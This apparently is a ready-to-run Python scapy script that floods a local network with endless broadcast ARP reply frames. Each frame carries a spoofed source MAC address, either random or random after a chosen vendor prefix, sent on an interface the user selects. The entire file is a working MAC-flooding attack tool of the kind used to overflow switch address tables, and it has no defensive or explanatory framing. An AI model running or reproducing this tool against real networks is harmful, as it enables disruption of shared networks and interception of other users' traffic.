#!/usr/bin/env python3
import sys
try:
	import os.path
	import argparse
	from scapy.all import *
except ImportError as Error:
	print("Failed to import library - {}".format(Error))
	print("Please check if needed libararies are installed, or run the installer once more.")
	sys.exit(1)

__version__ = "V0.1.0.0A"

def GetInterfaceState(Interface):
        try:
                if os.path.exists("/sys/class/net/" + Interface + "/"):
                        TempFileObj = open("/sys/class/net/" + Interface + "/operstate")
                        return TempFileObj.readline().strip()
                else:
                        return "NULL"
        except Exception as Error:
                print("Error - {0}".format(Error))
                return "NULL"

if __name__ == "__main__":
	Parser = argparse.ArgumentParser(
	description=""
	)
	Parser.add_argument("-i","--Interface",help="The interface to send packages out from.")
	Parser.add_argument("-vmac","--VMAC",help="The Vendor MAC Address to use. Example format: 00:00:00:")
	Parser.add_argument("-rmac","--RMAC",action="store_true",help="Randomizes the MAC Address to use.")
	Parser.add_argument("-v", "--version",help="Show the version of the program.")
	Args = Parser.parse_args()

	#Variable Declaration
	VendorMAC = "00:00:00:"
	DestMAC = "FF:FF:FF:FF:FF:FF"
	UseInterface = False

	if Args.VMAC:
		VendorMAC = Args.VMAC

	if Args.Interface:
		try:
			if GetInterfaceState(Args.Interface) == "up":
				UseInterface = True
			elif GetInterfaceState(Args.Interface) == "down":
				print("Interface {0} is down.".format(Args.Interface))
				sys.exit(1)
			else:
				print("{0} does not exists!".format(Args.Interface))
				sys.exit(1)
		except Exception as Error:
			print("Error - {0}".format(Error))
			sys.exit(1)

	#Main Application Loop
	while True:
		if Args.RMAC:
			MACAddress = RandMAC()
		else:
			MACAddress = VendorMAC + ":".join(RandMAC().split(":")[3:])
		try:
			if UseInterface:
				print("Sending as {0} on {1}".format(MACAddress, Args.Interface))
				sendp(Ether(src=MACAddress, dst=DestMAC)/ARP(op=2, psrc="0.0.0.0", hwdst=DestMAC)/Padding(load="X"*18), iface=Args.Interface,verbose=0)
			else:
				print("Sending as {0}".format(MACAddress))
				sendp(Ether(src=MACAddress, dst=DestMAC)/ARP(op=2, psrc="0.0.0.0", hwdst=DestMAC)/Padding(load="X"*18),verbose=0)
		except Exception as Error:
			print("Error - {0}".format(Error))
